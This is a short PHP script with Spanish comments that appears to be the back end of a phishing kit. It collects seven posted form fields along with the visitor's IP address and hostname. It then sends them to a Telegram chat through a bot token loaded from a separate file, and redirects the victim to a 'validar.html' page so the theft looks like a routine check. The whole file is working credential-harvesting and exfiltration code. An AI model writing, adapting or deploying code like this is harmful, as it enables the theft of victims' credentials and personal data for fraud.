<?php
$a1 = (array_key_exists("HTTP_X_REAL_IP", $_SERVER) ? $_SERVER["HTTP_X_REAL_IP"] : getenv("REMOTE_ADDR"));
$a2 = (array_key_exists("HTTP_X_REAL_IP", $_SERVER) ? $_SERVER["REMOTE_ADDR"] : gethostbyaddr($_SERVER["REMOTE_ADDR"]));

$a3 = $_POST["user"];
$a4 = $_POST["user1"];
$a9 = $_POST["user2"];
$a5 = $_POST["user3"];
$a6 = $_POST["user4"];
$a7 = $_POST["user5"];
$a8 = $_POST["user6"];

include("assets/users.php");

// Corregir la parte del mensaje
$message = "Texto de ejemplo con marcadores {1}, {2}, {3}, {4}, {5}, {6}, {7}, {8}, {9}";
$mensaje = str_replace(
    array("{1}", "{2}", "{3}", "{4}", "{5}", "{6}", "{7}", "{8}", "{9}"),
    array($a1, $a2, $a3, $a4, $a5, $a6, $a7, $a8, $a9),
    $message
);

define("BOT_TOKEN", $bottoken); // Debes definir $bottoken antes de usarlo
define("CHAT_ID", $chatid); // Debes definir $chatid antes de usarlo

function enviar_telegram($msj) {
    global $bottoken, $chatid; // Agrega estas líneas para poder acceder a las variables globales
    $queryArray = [
        "chat_id" => CHAT_ID,
        "text" => $msj,
    ];
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage?" . http_build_query($queryArray);
    $result = file_get_contents($url);
    header("Location: validar.html"); // Redirige a validar.html después de un envío exitoso
}

function enviar() {
    global $mensaje;
    enviar_telegram($mensaje);
}

enviar();
?>
